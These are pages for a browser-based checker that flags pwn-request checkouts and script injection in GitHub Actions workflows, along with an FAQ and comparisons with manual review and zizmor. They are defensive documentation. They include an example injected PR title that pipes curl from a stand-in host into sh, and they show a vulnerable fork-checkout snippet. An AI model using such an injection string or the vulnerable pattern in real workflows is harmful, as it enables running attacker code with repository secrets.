ACTIONS INJECTION CHECK · RUNS IN YOUR BROWSER

Is your GitHub Actions workflow open to a pwn request or script injection?

A workflow triggered by pull_request_target or workflow_run runs with your secrets even though a stranger's fork raised the event. If it checks out that fork's code, the fork's code runs with your secrets — a pwn request. And any run: step that drops ${{ github.event.pull_request.title }} (or another attacker-controlled value) straight into a shell command hands that stranger a shell — script injection. Paste your workflow YAML below and this page finds both, each with the exact fix.

Nothing is uploaded. The YAML you paste is read in this browser and never leaves your device, and this tool makes no network calls of its own.

1. Paste one or more workflow files

Copy the contents of each file under .github/workflows/ you want checked. Add more blocks for more files — nothing here reads your repository, so pasting is how it sees anything.

Paste at least one workflow file above and click Check.

Findings

File : LineTypeDetailFix

Prefer a CLI, or want this in your own CI?

Same logic, zero dependencies, one file:

python3 check.py                  # scan .github/workflows under the current directory
python3 check.py /path/to/repo    # scan a specific checkout
python3 check.py --format json    # machine-readable
python3 check.py --fail-on-risk   # exit 2 if any finding exists

Get check.py from the repo — stdlib only, nothing to install, no network calls. Wire --fail-on-risk into your own CI to block a newly-added finding before it merges.

Common questions

What is a "pwn request" in GitHub Actions?

A workflow triggered by pull_request_target or workflow_run runs with the base repository's secrets and a privileged GITHUB_TOKEN, even though the event itself was raised by a stranger's fork. If a step in that workflow checks out the untrusted head (for example ref: ${{ github.event.pull_request.head.sha }}) and a later step builds, tests, or otherwise executes that code, the fork's code runs with your secrets. GitHub's own security guidance documents this at length, and actions/checkout v7 (June 2026) started refusing the common form of it by default.

What is script injection in a run: step?

When a run: step interpolates ${{ github.event.pull_request.title }} (or another untrusted context value) directly into a shell command, the value is spliced into the script text before the shell ever sees it as data — not passed as a string. Since a PR title, issue body, or branch name is content a stranger fully controls, a title like "; curl evil.example | sh #" runs as a second command. GitHub's guidance names the fix: pass the value through a step env: var and reference it as a quoted shell variable instead.

Does this tool fetch anything from GitHub for me?

No. It makes no network calls at all — nothing here can, because nothing here talks to a server. Paste your workflow YAML and the scan runs entirely in this page.

Does a clean scan mean my workflows are secure?

No. This checks two specific, well-documented patterns. It is not a security audit and makes no claim about your workflows' overall security. Both patterns have variants this tool does not attempt to catch — a hand-rolled git checkout instead of actions/checkout, or an expression built in an unusual way.

Why does script injection get flagged regardless of trigger type?

Unlike the pwn-request checkout risk, script injection into a shell is dangerous on any trigger a stranger can influence — pull_request, issues, issue_comment — not just the two privileged triggers. A workflow token with even minimal permissions, or a runner with network access, is enough for an injected command to do damage.

More: what is a pwn request in GitHub Actions? Already run zizmor? See how this checker compares for the injection question specifically. Prefer to just read the file? See this checker vs. reading a workflow by hand.

It is not a security audit, a compliance attestation, or a guarantee that your CI is safe from injection attacks, and it does not replace a qualified professional. You are responsible for reviewing and verifying its output before relying on it. To the maximum extent permitted by law, the authors accept no liability for any loss or damage arising from its use.

We do not promise uptime, backups of anything you type, or that a URL will keep working. Do not use this as a system of record. If a tool needs to survive, get check.py from the repo and run it yourself.

Everything runs in your browser. The YAML you paste is never uploaded; there are no accounts, cookies, or analytics vendors, and the tool makes no network calls. Anonymous feature events (check_run, example_loaded) are counted only in local storage and can be deleted with the button below. Do Not Track and Global Privacy Control are honoured.

Also worth a pass over your workflows: Pinned Actions Check flags third-party uses: lines referenced by a mutable tag instead of a pinned commit SHA, Actions Permissions Check flags workflows and jobs with no explicit permissions: grant or with write-all, Actions Cache Poisoning Check flags an actions/cache write reachable from a fork trigger or an unscoped restore-keys fallback, and Actions Secret Leak Check flags a step that transforms a secret before it can be masked, or exports one to $GITHUB_ENV/$GITHUB_OUTPUT without ::add-mask:: — four more slices of a hardened CI setup. And your dependencies, not just your workflows: License Drift Check flags a package whose license changed since your last snapshot, the change Dependabot and Renovate don't. And beyond your workflows and dependencies, your own API: CORS Misconfiguration Checker sends real requests with crafted Origin headers and names the exact response header behind a reflected-origin, null-origin, or unanchored allow-list bypass -- the same "read what's actually there, name the exact evidence" shape, for a live HTTP response instead of a workflow file.

Want this check and 21 others in one pass? devsec-toolkit runs it alongside the rest of the portfolio's devsec checks (GitHub Actions, Docker, Compose, Kubernetes, supply chain, code, AI-agent configs) over a whole repository, with one report, SARIF for code scanning and a baseline so CI fails only on new findings.

vs-checking-a-workflow-by-hand.html.text:
← Back to Actions Injection Check

Actions Injection Check vs. reading a workflow by hand

Reading a workflow file with both patterns already in mind -- a pull_request_target or workflow_run trigger checking out an untrusted head, and a run: step interpolating an attacker-controlled ${{ github.event.* }} value -- genuinely works, and it is the method most people already use. This page names no product or company being compared against: "reading the workflow by hand" is a generic manual habit, not a competing tool.

CaseReading the workflow by handThis tool
An untrusted checkout ref sits a few lines below the trigger, in an otherwise short workflowCorrectly caught by a reviewer who already knows the patternCorrectly caught the same way
The same ref buried many steps into a long job, under a nested with: blockEasy to skip once attention has moved past the trigger line -- nothing highlights the connectionTracks the trigger once and matches any checkout ref against it regardless of distance
Deciding whether a specific github.event.* path carries attacker contentRequires memorizing or looking up which suffixes (title, body, ref, head_ref, …) are untrusted -- getting it wrong either over-flags a safe field or misses an unsafe oneChecks every path found against the same fixed, documented suffix list every time
An untrusted expression on line eight of a twelve-line run: | blockEasy to under-review once the first few lines look ordinaryScans every line inside the block at its own indentation, not just the first
An expression embedded inside format() or a comparison rather than standing aloneEasy to miss if scanning for a bare ${{ github.event... }} onlyMatches the context path wherever it occurs in the line, not only as a standalone expression
Checking every workflow file in a repository on every dependency-bump PRManual, and the first thing skipped under time pressureCLI scans a whole checkout in one pass; --fail-on-risk blocks CI, SARIF output attaches findings to the PR diff

The gap that matters most: the trigger-to-checkout connection, at any distance

The pwn-request pattern is not one dangerous line, it is a relationship between two lines that can be far apart: a trigger declaration at the top of the file, and a checkout ref: possibly dozens of lines later inside a job's steps. A reviewer has to hold the trigger in mind while reading every subsequent step to notice the connection, and a workflow with several jobs and many steps makes that easy to lose. This tool notes the trigger once when it scans the file and then checks every subsequent checkout step's ref: against it, so the distance between the two lines never matters.

The gap that matters second: which fields are actually untrusted

Not every github.event.* path is attacker-controlled -- github.event.repository.name is set by GitHub, github.event.pull_request.title is text the PR's author wrote. GitHub's own guidance names the specific suffixes that carry untrusted content, and a reviewer without that list memorized either has to look it up every time or guess. This tool checks every matched path's suffix against that same fixed list, so the answer does not depend on what a reviewer happens to remember that day.

When to still read the workflow yourself

This tool has no opinion on whether a workflow should use pull_request_target at all -- it has legitimate uses, such as labeling a PR based on its base branch. Deciding whether the trigger is warranted, and catching variants this tool does not attempt (a hand-rolled git checkout instead of actions/checkout, or an expression built by unusual string concatenation), is still a job for reading the workflow yourself.

Common questions

What does reading a workflow file by hand actually catch?

A careful reviewer who knows GitHub's own guidance can spot both patterns this tool checks: a pull_request_target or workflow_run workflow that checks out an untrusted head, and a run: step that drops an attacker-controlled ${{ github.event.* }} value straight into a shell command. That review genuinely works when the file is short and the reviewer already has both patterns in mind -- the same two patterns this tool's classify.mjs looks for.

Why is the untrusted-checkout pattern easy to miss on a skim?

Spotting it requires remembering that exactly two triggers -- pull_request_target and workflow_run -- run with the base repository's secrets even though a stranger's fork raised the event, and then tracing forward from that trigger line to a checkout step's ref:, which can sit many lines later inside a with: block nested under a job with several other steps. A reviewer skimming for anything that looks obviously dangerous has no reason to single out an ordinary-looking actions/checkout@v4 step unless they already made that trigger-to-checkout connection at the top of the file. This tool tracks the connection mechanically: it notes the trigger once, then flags any checkout ref matching the untrusted-head pattern regardless of how many steps or lines separate the two.

Why is knowing which github.event.* fields are untrusted hard to keep in your head?

Not every github.event.* path carries attacker content -- github.event.repository.name is set by GitHub itself, while github.event.pull_request.title is text the pull request's author wrote. GitHub's own script-injection guidance names the specific suffixes that carry untrusted content (title, body, message, label, ref, head_ref, and a handful more); a reviewer has to either memorize that list or look it up every time, and getting it wrong runs in both directions -- flagging a safe field wastes review time, missing an unsafe one is the actual injection. This tool checks every github.event.* path found anywhere in a run: step, including inside format() calls and comparisons, against that same fixed suffix list every time.

Why is a multi-line run: block easy to under-review?

A run: step written as a YAML block scalar (run: |) can run many lines of shell, and an untrusted expression on line eight of a twelve-line script is easy to miss once a reviewer's attention has settled after the first few, ordinary-looking lines. This tool scans every line inside the block at the block's own indentation, not just its first line, so a path buried on the last line is caught the same as one on the first.

Does this replace understanding why a workflow needs pull_request_target at all?

No. pull_request_target has legitimate uses -- commenting on a PR with a label based on the base branch, for instance -- and this tool has no opinion on whether a given workflow should use it. It only flags the specific combination of that trigger with an untrusted checkout ref, or an untrusted value spliced into a shell command. Deciding whether the trigger itself is warranted, and catching variants this tool does not attempt (a hand-rolled git checkout instead of actions/checkout, an expression built by unusual string concatenation), is still a job for reading the workflow yourself.

Evidence, not a determination. This checks two specific, well-documented injection patterns. A clean report describes what those two checks found, not a guarantee your workflows are safe from injection attacks generally.

Free and open source. The code is under an MIT licence -- support is entirely optional and never changes what the tool does.

vs-zizmor.html.text:
← Actions Injection Check

Actions Injection Check vs. zizmor

Two overlapping findings, very different packaging. zizmor is an installable, open-source CLI that audits a workflow against a broad catalogue of GitHub Actions security patterns -- including the two this page checks. This tool answers only the injection question, on one file you paste, free, with nothing to install and no network call of its own.

What each tool is for

zizmor (github.com/zizmorcore/zizmor) is an open-source, MIT-licensed static analysis tool for GitHub Actions, installed with pip install zizmor or cargo install zizmor and run against workflow files or a whole repository. Per its own documentation, its audits cover template injection (attacker-controlled code execution via an untrusted ${{ ... }} expression spliced into a shell command), dangerous triggers (pull_request_target and workflow_run -- the pwn-request shape), excessive permission scopes, credential persistence and leakage, cache poisoning, and impostor or confusable commit references, among others. It can emit plain-text, JSON, or SARIF output, the last of which integrates with GitHub's code-scanning feature, and it runs offline by default; an optional online mode (set GH_TOKEN, GITHUB_TOKEN, or ZIZMOR_GITHUB_TOKEN) enables audits that benefit from GitHub API access.

This checker does two of those things and nothing else: you paste the YAML of a workflow file, and it lists every pull_request_target/workflow_run checkout of an untrusted head and every run: step that interpolates an untrusted ${{ github.event.* }} expression, each with the exact fix. It runs entirely in your browser, needs no install and no token, and makes no network call of its own under any configuration.

Where to answer each question.
QuestionWhere to answer it
I want one maintained scanner covering dozens of GitHub Actions security patterns -- permissions, credential leakage, cache poisoning, impostor commits, injection, and more.zizmor -- that breadth is its entire job, and this tool checks only two of those patterns.
I just want to know if the one workflow file in front of me has a pwn-request checkout or a shell-injection line, right now, with nothing to install.This checker -- paste the YAML, get the two-row answer, no CLI and no repository access.
I want SARIF output wired into GitHub code scanning, or a report across an entire repository of workflows.zizmor -- its CLI and GitHub Action are built for exactly that.
I want this specific check to fail my CI automatically.Either: zizmor's own GitHub Action, or this tool's check.py --fail-on-risk for the injection question specifically.
I don't want to install a CLI (pip or cargo) or add a new GitHub Action just to check one file.This checker -- it is a page, not a package.

The two are complementary, not competing: a repository can run zizmor in CI for the full catalogue of checks and still reach for this tool the moment the question is "does this one pasted file have a pwn-request or injection problem" without installing anything.

Run the free injection check

Common questions

Should I use this checker or zizmor?

They overlap on exactly two findings and differ everywhere else. zizmor is an open-source, MIT-licensed static analysis CLI (installed with pip install zizmor or cargo install zizmor) that audits a GitHub Actions workflow -- or a whole repository of them -- against a broad, growing catalogue of checks: template injection, dangerous triggers such as pull_request_target and workflow_run, excessive permission scopes, credential leakage, cache poisoning, and impostor or confusable commit references, among others, per its own documentation. This tool checks two of those findings only -- the pwn-request checkout and the shell script-injection pattern -- and runs entirely in your browser on YAML you paste, with nothing to install and no repository access. If you want one maintained tool covering dozens of GitHub Actions security patterns with CI-ready output, zizmor is the right tool. If you want a fast, no-install answer to the injection question on one file in front of you right now, this is the narrower tool for that.

Does zizmor already catch what this tool catches?

For these two patterns specifically, yes -- zizmor's own documentation names a template-injection audit for untrusted expressions spliced into a run: step and a dangerous-triggers audit for pull_request_target and workflow_run, which is the same pwn-request and script-injection ground this tool covers. The difference is packaging, not detection power: zizmor runs both audits (and the rest of its catalogue) as part of one CLI invocation you install and point at files or a repository, and can emit SARIF for GitHub code scanning; this tool runs only those two checks, in a page you open with nothing to install, for the moment you want one quick answer rather than a full scan.

Why use a narrower tool if zizmor already covers more ground?

Two reasons this tool exists alongside it. First, zizmor is a CLI you install with pip or cargo and then run against files on disk; this tool is a page you open and paste into, which is faster when the workflow is not yet checked out anywhere, or you just want to check the one file in front of you. Second, a broad multi-category scan report is a different shape of answer than a two-row table naming exactly which line is a pwn-request checkout or a script-injection sink and what to change -- when the question is only the injection one, this tool's narrower output is faster to read.

Does this tool need a GitHub token the way zizmor sometimes does?

No, never. zizmor documents an optional online mode -- enabled by setting GH_TOKEN, GITHUB_TOKEN or ZIZMOR_GITHUB_TOKEN -- for audits that benefit from GitHub API access, and runs offline by default when none of those are set, which already covers the two checks this tool performs. This tool has no online mode to opt into: it makes no network call of its own under any configuration, because nothing here talks to a server at all.

Is this page affiliated with zizmor or its maintainers?

No. This site is not affiliated with, endorsed by, or sponsored by zizmor, zizmorcore, or its maintainers. zizmor is an independent open-source project, named here only to describe what this checker is and is not, using facts drawn from its own public documentation, source repository at github.com/zizmorcore/zizmor, and package listing at pypi.org/project/zizmor.

what-is-a-pwn-request-in-github-actions..text:
← Actions Injection Check

What is a "pwn request" in GitHub Actions?

pull_request, the ordinary PR trigger, runs with a read-only token and no repository secrets — safe even against a hostile fork, because there is nothing valuable for the fork's code to reach. pull_request_target exists for the cases that need more: commenting on the PR, labeling it, or building it with real credentials. It runs in the context of the base repository, with the base repository's secrets and a privileged GITHUB_TOKEN — but the event that triggers it is still raised by whoever opened the pull request, who might be a stranger.

By itself that is fine: actions/checkout under pull_request_target checks out the base branch by default, not the fork. The danger is one line away:

- uses: actions/checkout@v4
  with:
    ref: ${{ github.event.pull_request.head.sha }}

That explicit ref: pulls the fork's own commit into the checkout — a natural thing to write if the goal is "build and test the PR's actual changes". If a later step runs npm install, a Makefile, or anything else from that checkout, it runs the fork's code with the base repository's secrets. workflow_run has the identical shape: it runs privileged, in response to a workflow that a fork's push already triggered.

Why is it called a "pwn request"?

Coined by security researchers describing exactly this pattern: the pull request itself is the exploit delivery mechanism. An attacker needs no special access — opening a pull request is the interaction the workflow is designed to respond to. GitHub's own security guidance ("Keeping your GitHub Actions and workflows secure, Part 1: Preventing pwn requests") documents the shape and the fix at length, and it was significant enough that actions/checkout v7 (June 2026) started refusing to fetch fork PR code in pull_request_target and workflow_run workflows by default.

The fix

  • Prefer plain pull_request for anything that only needs to build and test the PR's code — it is unprivileged by design, so there is nothing to steal.
  • If you genuinely need pull_request_target's privileges (posting a comment, applying a label), do not check out the fork's code in that same job. Split the work: an unprivileged pull_request workflow builds and tests, uploads its results as an artifact; a separate pull_request_target job only downloads and acts on that artifact, never the fork's source.
  • Upgrade to actions/checkout v7 or later, which refuses the common form of this pattern by default.

Check your own workflows

Paste your workflow YAML into Actions Injection Check to find every pull_request_target/workflow_run checkout of an untrusted ref across every workflow file at once, or run the CLI in your own repository:

python3 check.py --fail-on-risk

That exits with a nonzero status if any workflow has this pattern (or the related script-injection pattern) — wire it into your own CI to block a newly-added one before it merges.

No warranty. This page and the tool it describes are provided free and as-is, without warranty of any kind. This is not a security audit or a compliance attestation, and a clean scan does not mean a workflow is secure — only that this one documented pattern was not found.

Best-effort hosting, no SLA. Free, experimental, may move or go offline without notice.

Everything on the linked tool runs in your browser; nothing you paste is uploaded, and the tool makes no network calls of its own.
